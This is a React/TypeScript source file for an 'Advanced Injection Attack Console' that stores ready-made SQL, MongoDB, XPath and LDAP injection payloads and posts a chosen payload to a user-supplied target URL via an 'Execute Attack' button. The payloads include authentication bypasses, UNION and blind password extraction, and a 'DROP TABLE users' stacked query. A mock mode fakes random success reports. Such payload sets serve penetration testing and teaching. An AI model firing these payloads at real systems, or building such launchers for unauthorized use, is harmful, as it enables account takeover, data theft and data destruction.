/**
 * NoSQLAttackerGUI Component
 * 
 * A comprehensive cross-platform GUI for generating and managing various injection payloads
 * including SQL, NoSQL (MongoDB), XPath, and LDAP injection attacks.
 * 
 * Features:
 * - Tab-based injection type selector
 * - Pre-built payload libraries for each attack type
 * - Custom payload editor with syntax highlighting
 * - Auto-fill with common attack vectors
 * - Response/feedback display area
 * - Dark/Light mode support
 * - Tailwind CSS styling matching Megido UI conventions
 * 
 * Usage:
 * ```tsx
 * import NoSQLAttackerGUI from './components/NoSQLAttackerGUI';
 * 
 * function App() {
 *   return <NoSQLAttackerGUI />;
 * }
 * ```
 * 
 * Integration:
 * - Connect to backend API endpoint: POST /api/nosqli/attack/
 * - Payload format: { type: string, payload: string, target: string }
 * - Response format: { success: boolean, result: string, data?: any }
 * 
 * @module NoSQLAttackerGUI
 * @version 1.0.0
 */

import React, { useState, useEffect } from 'react';

// Type definitions
type InjectionType = 'SQL' | 'NoSQL' | 'XPath' | 'LDAP';

interface Payload {
  name: string;
  value: string;
  description: string;
  category?: string;
}

interface AttackResponse {
  success: boolean;
  result: string;
  data?: any;
  timestamp?: string;
}

/**
 * Comprehensive payload libraries for each injection type
 */
const PAYLOAD_LIBRARIES: Record<InjectionType, Payload[]> = {
  SQL: [
    { 
      name: 'Basic OR Bypass', 
      value: "' OR '1'='1", 
      description: 'Classic authentication bypass',
      category: 'Authentication Bypass'
    },
    { 
      name: 'Union Select', 
      value: "' UNION SELECT NULL, username, password FROM users--", 
      description: 'Extract data from users table',
      category: 'Data Extraction'
    },
    { 
      name: 'Time-Based Blind', 
      value: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 
      description: 'MySQL time-based blind injection',
      category: 'Blind Injection'
    },
    { 
      name: 'Boolean Blind', 
      value: "' AND 1=1--", 
      description: 'Boolean-based blind SQL injection',
      category: 'Blind Injection'
    },
    { 
      name: 'Comment Out', 
      value: "admin'--", 
      description: 'Comment out rest of query',
      category: 'Authentication Bypass'
    },
    { 
      name: 'Stacked Queries', 
      value: "'; DROP TABLE users;--", 
      description: 'Execute multiple statements (dangerous)',
      category: 'Advanced'
    },
    { 
      name: 'Error-Based', 
      value: "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))--", 
      description: 'Extract data via error messages',
      category: 'Data Extraction'
    },
    { 
      name: 'Second Order', 
      value: "admin'-- -", 
      description: 'Second order SQL injection bypass',
      category: 'Advanced'
    },
  ],
  NoSQL: [
    { 
      name: 'MongoDB Auth Bypass', 
      value: '{"username": {"$ne": null}, "password": {"$ne": null}}', 
      description: 'Bypass MongoDB authentication using $ne operator',
      category: 'Authentication Bypass'
    },
    { 
      name: 'MongoDB OR Injection', 
      value: '{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}', 
      description: 'OR-based MongoDB injection',
      category: 'Authentication Bypass'
    },
    { 
      name: 'MongoDB Regex Injection', 
      value: '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}', 
      description: 'Regex wildcard bypass',
      category: 'Data Extraction'
    },
    { 
      name: 'MongoDB GT Injection', 
      value: '{"username": "admin", "password": {"$gt": ""}}', 
      description: 'Greater than operator bypass',
      category: 'Authentication Bypass'
    },
    { 
      name: 'MongoDB Where Injection', 
      value: '{"$where": "this.username == \'admin\' || \'1\'==\'1\'"}', 
      description: 'JavaScript injection in $where clause',
      category: 'Advanced'
    },
    { 
      name: 'MongoDB NE Array', 
      value: '{"username": {"$ne": []}, "password": {"$ne": []}}', 
      description: 'Array-based not-equal bypass',
      category: 'Authentication Bypass'
    },
    { 
      name: 'MongoDB Exists', 
      value: '{"username": {"$exists": true}, "password": {"$exists": true}}', 
      description: 'Check field existence',
      category: 'Data Extraction'
    },
    { 
      name: 'MongoDB Nin', 
      value: '{"username": {"$nin": [""]}, "password": {"$nin": [""]}}', 
      description: 'Not-in array operator bypass',
      category: 'Authentication Bypass'
    },
  ],
  XPath: [
    { 
      name: 'Basic OR Bypass', 
      value: "' or 'a'='a", 
      description: 'Classic XPath authentication bypass',
      category: 'Authentication Bypass'
    },
    { 
      name: 'Parent Node Injection', 
      value: "' or 1=1 or ''='", 
      description: 'Break out and inject OR condition',
      category: 'Authentication Bypass'
    },
    { 
      name: 'Comment Injection', 
      value: "admin' or '1'='1'--", 
      description: 'Comment out remaining XPath query',
      category: 'Authentication Bypass'
    },
    { 
      name: 'Node Selection', 
      value: "'] | //* | a['", 
      description: 'Select all nodes using union',
      category: 'Data Extraction'
    },
    { 
      name: 'Substring Extraction', 
      value: "' and substring(//user[position()=1]/password,1,1)='a", 
      description: 'Extract password character by character',
      category: 'Blind Injection'
    },
    { 
      name: 'String Length', 
      value: "' and string-length(//user[position()=1]/password)>5 or 'a'='b", 
      description: 'Determine password length',
      category: 'Blind Injection'
    },
    { 
      name: 'Count Nodes', 
      value: "' and count(//user)=1 or 'a'='b", 
      description: 'Count number of user nodes',
      category: 'Data Extraction'
    },
    { 
      name: 'Blind Boolean', 
      value: "admin' and '1'='1", 
      description: 'Boolean-based blind XPath injection',
      category: 'Blind Injection'
    },
  ],
  LDAP: [
    { 
      name: 'Basic Wildcard', 
      value: '*', 
      description: 'Match any entry',
      category: 'Authentication Bypass'
    },
    { 
      name: 'OR Injection', 
      value: '(|(uid=*)(uid=*))', 
      description: 'OR-based authentication bypass',
      category: 'Authentication Bypass'
    },
    { 
      name: 'AND Bypass', 
      value: '*)(&(objectClass=*', 
      description: 'Break AND condition',
      category: 'Authentication Bypass'
    },
    { 
      name: 'Wildcard User', 
      value: 'admin*', 
      description: 'Match users starting with admin',
      category: 'Data Extraction'
    },
    { 
      name: 'Empty Password', 
      value: '*)(uid=*))(|(uid=*', 
      description: 'Bypass empty password check',
      category: 'Authentication Bypass'
    },
    { 
      name: 'NOT Filter', 
      value: '(!(uid=*))', 
      description: 'Negate filter condition',
      category: 'Advanced'
    },
    { 
      name: 'Attribute Injection', 
      value: '*)(|(userPassword=*))((objectClass=*', 
      description: 'Inject attribute check',
      category: 'Data Extraction'
    },
    { 
      name: 'Group Extraction', 
      value: '*)(cn=*))(&(objectClass=*', 
      description: 'Extract group information',
      category: 'Data Extraction'
    },
  ],
};

/**
 * NoSQLAttackerGUI Main Component
 * 
 * @returns {JSX.Element} The rendered component
 */
const NoSQLAttackerGUI: React.FC = () => {
  // State management
  const [activeTab, setActiveTab] = useState<InjectionType>('NoSQL');
  const [selectedPayload, setSelectedPayload] = useState<Payload | null>(null);
  const [customPayload, setCustomPayload] = useState<string>('');
  const [targetUrl, setTargetUrl] = useState<string>('');
  const [responseLog, setResponseLog] = useState<AttackResponse[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [isDarkMode, setIsDarkMode] = useState<boolean>(true);

  /**
   * Initialize component - detect system theme preference
   */
  useEffect(() => {
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    setIsDarkMode(prefersDark);
  }, []);

  /**
   * Handle payload selection from library
   * @param payload - Selected payload object
   */
  const handlePayloadSelect = (payload: Payload) => {
    setSelectedPayload(payload);
    setCustomPayload(payload.value);
  };

  /**
   * Auto-fill with example payload for current injection type
   */
  const handleAutoFill = () => {
    const payloads = PAYLOAD_LIBRARIES[activeTab];
    if (payloads.length > 0) {
      handlePayloadSelect(payloads[0]);
    }
  };

  /**
   * Clear all inputs and logs
   */
  const handleClear = () => {
    setCustomPayload('');
    setSelectedPayload(null);
    setTargetUrl('');
  };

  /**
   * Clear response logs
   */
  const handleClearLogs = () => {
    setResponseLog([]);
  };

  /**
   * Copy payload to clipboard
   * @param text - Text to copy
   */
  const handleCopy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      // Show toast notification (could be enhanced with a toast library)
      console.log('Copied to clipboard!');
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  /**
   * Execute attack with current payload
   * Connects to backend API or uses mock data for testing
   */
  const handleExecute = async () => {
    if (!customPayload.trim()) {
      alert('Please enter or select a payload');
      return;
    }

    if (!targetUrl.trim()) {
      alert('Please enter a target URL');
      return;
    }

    setIsLoading(true);

    try {
      // TODO: Replace with actual API endpoint when backend is ready
      // For now, using mock response for demonstration
      // IMPORTANT: Set this to false when backend API is ready for production
      // Consider using environment variable: process.env.REACT_APP_USE_MOCK_DATA
      const useMockData = true; // Set to false when backend is available

      let response: AttackResponse;

      if (useMockData) {
        // Simulate API delay
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        response = {
          success: Math.random() > 0.3,
          result: Math.random() > 0.3 
            ? `Attack executed successfully. Found ${Math.floor(Math.random() * 10) + 1} matching records.`
            : 'Attack failed: Target server returned error or blocked request.',
          data: {
            type: activeTab,
            payload: customPayload,
            target: targetUrl,
            recordsFound: Math.floor(Math.random() * 10) + 1,
          },
          timestamp: new Date().toISOString(),
        };
      } else {
        // Actual API call
        const apiResponse = await fetch('/api/nosqli/attack/', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            type: activeTab,
            payload: customPayload,
            target: targetUrl,
          }),
        });

        response = await apiResponse.json();
        response.timestamp = new Date().toISOString();
      }

      // Add to response log
      setResponseLog(prev => [response, ...prev]);
    } catch (error) {
      const errorResponse: AttackResponse = {
        success: false,
        result: `Error: ${error instanceof Error ? error.message : 'Unknown error occurred'}`,
        timestamp: new Date().toISOString(),
      };
      setResponseLog(prev => [errorResponse, ...prev]);
    } finally {
      setIsLoading(false);
    }
  };

  /**
   * Get current payloads for active tab
   */
  const currentPayloads = PAYLOAD_LIBRARIES[activeTab];

  /**
   * Group payloads by category
   */
  const groupedPayloads = currentPayloads.reduce((acc, payload) => {
    const category = payload.category || 'Other';
    if (!acc[category]) {
      acc[category] = [];
    }
    acc[category].push(payload);
    return acc;
  }, {} as Record<string, Payload[]>);

  return (
    <div className={`min-h-screen ${isDarkMode ? 'dark bg-midnight-950' : 'bg-gray-50'}`}>
      <div className="container mx-auto px-4 py-6 lg:py-8 max-w-7xl">
        {/* Header */}
        <div className="glass-strong rounded-xl border border-gray-200/50 dark:border-gray-700/50 p-6 mb-6 shadow-premium">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-4">
              <div className="flex items-center justify-center w-12 h-12 rounded-lg bg-gradient-to-r from-primary-500 to-secondary-500 shadow-lg">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" />
                </svg>
              </div>
              <div>
                <h1 className="text-2xl lg:text-3xl font-bold text-gray-900 dark:text-white">
                  Advanced Injection Attack Console
                </h1>
                <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                  Generate and test injection payloads for SQL, NoSQL, XPath, and LDAP
                </p>
              </div>
            </div>
            
            {/* Theme Toggle */}
            <button
              onClick={() => setIsDarkMode(!isDarkMode)}
              className="p-3 rounded-lg bg-white/60 dark:bg-gray-800/60 hover:bg-white dark:hover:bg-gray-800 transition-all duration-200 shadow-md hover:shadow-lg"
              aria-label="Toggle theme"
            >
              {isDarkMode ? (
                <svg className="w-5 h-5 text-yellow-500" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clipRule="evenodd" />
                </svg>
              ) : (
                <svg className="w-5 h-5 text-gray-700" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" />
                </svg>
              )}
            </button>
          </div>

          {/* Injection Type Tabs */}
          <div className="flex flex-wrap gap-2">
            {(['SQL', 'NoSQL', 'XPath', 'LDAP'] as InjectionType[]).map((type) => (
              <button
                key={type}
                onClick={() => {
                  setActiveTab(type);
                  setSelectedPayload(null);
                  setCustomPayload('');
                }}
                className={`px-6 py-3 rounded-lg font-medium text-sm transition-all duration-200 ${
                  activeTab === type
                    ? 'bg-gradient-to-r from-primary-500 to-primary-600 text-white shadow-lg shadow-primary-500/30'
                    : 'bg-white/60 dark:bg-gray-800/60 text-gray-700 dark:text-gray-300 hover:bg-white dark:hover:bg-gray-800 hover:shadow-md'
                }`}
              >
                {type}
              </button>
            ))}
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Left Panel - Payload Library */}
          <div className="lg:col-span-1 glass-strong rounded-xl border border-gray-200/50 dark:border-gray-700/50 p-6 shadow-premium">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-lg font-bold text-gray-900 dark:text-white">
                Payload Library
              </h2>
              <span className="px-3 py-1 text-xs font-medium bg-primary-100 dark:bg-primary-900/30 text-primary-700 dark:text-primary-400 rounded-full">
                {currentPayloads.length} payloads
              </span>
            </div>

            <div className="space-y-4 max-h-[600px] overflow-y-auto pr-2 scrollbar-thin">
              {Object.entries(groupedPayloads).map(([category, payloads]) => (
                <div key={category}>
                  <h3 className="text-xs font-bold text-gray-500 dark:text-gray-400 uppercase tracking-wider mb-2 px-2">
                    {category}
                  </h3>
                  <div className="space-y-2">
                    {payloads.map((payload, index) => (
                      <button
                        key={`${category}-${index}`}
                        onClick={() => handlePayloadSelect(payload)}
                        className={`w-full text-left p-3 rounded-lg transition-all duration-200 group ${
                          selectedPayload === payload
                            ? 'bg-primary-100 dark:bg-primary-900/30 border border-primary-300 dark:border-primary-700'
                            : 'bg-white/60 dark:bg-gray-800/60 hover:bg-white dark:hover:bg-gray-800 border border-transparent'
                        }`}
                      >
                        <div className="flex items-start justify-between gap-2">
                          <div className="flex-1 min-w-0">
                            <h4 className="text-sm font-semibold text-gray-900 dark:text-white truncate">
                              {payload.name}
                            </h4>
                            <p className="text-xs text-gray-600 dark:text-gray-400 mt-1 line-clamp-2">
                              {payload.description}
                            </p>
                          </div>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleCopy(payload.value);
                            }}
                            className="flex-shrink-0 p-1.5 rounded hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors"
                            title="Copy to clipboard"
                          >
                            <svg className="w-4 h-4 text-gray-500 dark:text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                            </svg>
                          </button>
                        </div>
                      </button>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Right Panel - Payload Editor and Execution */}
          <div className="lg:col-span-2 space-y-6">
            {/* Payload Editor */}
            <div className="glass-strong rounded-xl border border-gray-200/50 dark:border-gray-700/50 p-6 shadow-premium">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-bold text-gray-900 dark:text-white">
                  Payload Editor
                </h2>
                <div className="flex gap-2">
                  <button
                    onClick={handleAutoFill}
                    className="px-4 py-2 text-sm font-medium bg-info-100 dark:bg-info-900/30 text-info-700 dark:text-info-400 rounded-lg hover:bg-info-200 dark:hover:bg-info-900/50 transition-all duration-200"
                  >
                    Auto-fill Example
                  </button>
                  <button
                    onClick={handleClear}
                    className="px-4 py-2 text-sm font-medium bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600 transition-all duration-200"
                  >
                    Clear
                  </button>
                </div>
              </div>

              {selectedPayload && (
                <div className="mb-4 p-4 rounded-lg bg-primary-50 dark:bg-primary-900/20 border border-primary-200 dark:border-primary-800">
                  <div className="flex items-start gap-3">
                    <svg className="w-5 h-5 text-primary-600 dark:text-primary-400 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                    </svg>
                    <div>
                      <h4 className="text-sm font-semibold text-primary-900 dark:text-primary-100">
                        {selectedPayload.name}
                      </h4>
                      <p className="text-xs text-primary-700 dark:text-primary-300 mt-1">
                        {selectedPayload.description}
                      </p>
                    </div>
                  </div>
                </div>
              )}

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    Target URL
                  </label>
                  <input
                    type="text"
                    value={targetUrl}
                    onChange={(e) => setTargetUrl(e.target.value)}
                    placeholder="https://target.example.com/api/endpoint"
                    className="w-full px-4 py-3 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-700 rounded-lg text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-transparent transition-all"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                    Custom Payload
                  </label>
                  <textarea
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    placeholder={`Enter your ${activeTab} injection payload here...`}
                    rows={8}
                    className="w-full px-4 py-3 bg-white dark:bg-gray-900 border border-gray-300 dark:border-gray-700 rounded-lg text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-transparent transition-all font-mono text-sm"
                  />
                </div>

                <button
                  onClick={handleExecute}
                  disabled={isLoading}
                  className={`w-full px-6 py-4 rounded-lg font-semibold text-white transition-all duration-200 ${
                    isLoading
                      ? 'bg-gray-400 dark:bg-gray-600 cursor-not-allowed'
                      : 'bg-gradient-to-r from-primary-500 to-primary-600 hover:from-primary-600 hover:to-primary-700 shadow-lg hover:shadow-xl shadow-primary-500/30'
                  }`}
                >
                  {isLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <svg className="animate-spin h-5 w-5" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                      </svg>
                      Executing Attack...
                    </span>
                  ) : (
                    'Execute Attack'
                  )}
                </button>
              </div>
            </div>

            {/* Response Log */}
            <div className="glass-strong rounded-xl border border-gray-200/50 dark:border-gray-700/50 p-6 shadow-premium">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-bold text-gray-900 dark:text-white">
                  Response Log
                </h2>
                {responseLog.length > 0 && (
                  <button
                    onClick={handleClearLogs}
                    className="px-3 py-1.5 text-xs font-medium bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600 transition-all duration-200"
                  >
                    Clear Log
                  </button>
                )}
              </div>

              <div className="space-y-3 max-h-[400px] overflow-y-auto pr-2 scrollbar-thin">
                {responseLog.length === 0 ? (
                  <div className="text-center py-12">
                    <svg className="w-16 h-16 mx-auto text-gray-400 dark:text-gray-600 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                    <p className="text-gray-500 dark:text-gray-400 text-sm">
                      No responses yet. Execute an attack to see results here.
                    </p>
                  </div>
                ) : (
                  responseLog.map((response, index) => (
                    <div
                      key={index}
                      className={`p-4 rounded-lg border ${
                        response.success
                          ? 'bg-success-50 dark:bg-success-900/20 border-success-200 dark:border-success-800'
                          : 'bg-danger-50 dark:bg-danger-900/20 border-danger-200 dark:border-danger-800'
                      }`}
                    >
                      <div className="flex items-start gap-3">
                        {response.success ? (
                          <svg className="w-5 h-5 text-success-600 dark:text-success-400 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                          </svg>
                        ) : (
                          <svg className="w-5 h-5 text-danger-600 dark:text-danger-400 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                          </svg>
                        )}
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between gap-2 mb-2">
                            <span className={`text-xs font-semibold ${
                              response.success
                                ? 'text-success-700 dark:text-success-300'
                                : 'text-danger-700 dark:text-danger-300'
                            }`}>
                              {response.success ? 'SUCCESS' : 'FAILED'}
                            </span>
                            {response.timestamp && (
                              <span className="text-xs text-gray-500 dark:text-gray-500">
                                {new Date(response.timestamp).toLocaleTimeString()}
                              </span>
                            )}
                          </div>
                          <p className={`text-sm ${
                            response.success
                              ? 'text-success-800 dark:text-success-200'
                              : 'text-danger-800 dark:text-danger-200'
                          }`}>
                            {response.result}
                          </p>
                          {response.data && (
                            <details className="mt-2">
                              <summary className={`text-xs cursor-pointer ${
                                response.success
                                  ? 'text-success-700 dark:text-success-400'
                                  : 'text-danger-700 dark:text-danger-400'
                              } hover:underline`}>
                                View Details
                              </summary>
                              <pre className="mt-2 p-2 bg-black/20 rounded text-xs overflow-x-auto">
                                {JSON.stringify(response.data, null, 2)}
                              </pre>
                            </details>
                          )}
                        </div>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Footer Info */}
        <div className="mt-6 glass-strong rounded-xl border border-gray-200/50 dark:border-gray-700/50 p-4 shadow-md">
          <div className="flex items-start gap-3">
            <svg className="w-5 h-5 text-warning-600 dark:text-warning-400 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
            </svg>
            <div>
              <h4 className="text-sm font-semibold text-gray-900 dark:text-white mb-1">
                Security Warning
              </h4>
              <p className="text-xs text-gray-600 dark:text-gray-400">
                This tool is for educational and authorized security testing purposes only. 
                Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Custom Styles for scrollbar */}
      <style jsx>{`
        .scrollbar-thin::-webkit-scrollbar {
          width: 6px;
        }
        .scrollbar-thin::-webkit-scrollbar-track {
          background: transparent;
        }
        .scrollbar-thin::-webkit-scrollbar-thumb {
          background: ${isDarkMode ? 'rgba(156, 163, 175, 0.3)' : 'rgba(209, 213, 219, 0.5)'};
          border-radius: 3px;
        }
        .scrollbar-thin::-webkit-scrollbar-thumb:hover {
          background: ${isDarkMode ? 'rgba(156, 163, 175, 0.5)' : 'rgba(209, 213, 219, 0.8)'};
        }
        .glass-strong {
          background: ${isDarkMode 
            ? 'rgba(17, 24, 39, 0.7)' 
            : 'rgba(255, 255, 255, 0.7)'};
          backdrop-filter: blur(12px);
        }
      `}</style>
    </div>
  );
};

export default NoSQLAttackerGUI;
